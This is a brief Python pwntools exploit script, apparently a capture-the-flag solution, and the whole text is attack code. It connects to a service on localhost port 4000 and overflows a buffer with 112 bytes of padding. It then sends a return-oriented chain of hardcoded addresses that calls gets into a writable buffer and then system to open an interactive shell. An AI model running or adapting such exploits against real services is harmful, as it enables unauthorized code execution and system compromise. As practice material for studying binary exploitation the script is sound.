from pwn import *

r = remote('127.0.0.1',4000)

raw_input('#')

gets = 0x8048430
buf2 = 0x804a080
system = 0x8048460
r.sendline('A'*112+p32(0x08048460)+p32(0x08048435)+p32(0x804a080)+p32(0x08048490)+p32(0xaaaabbbb)+p32(0x804a080))
r.interactive()
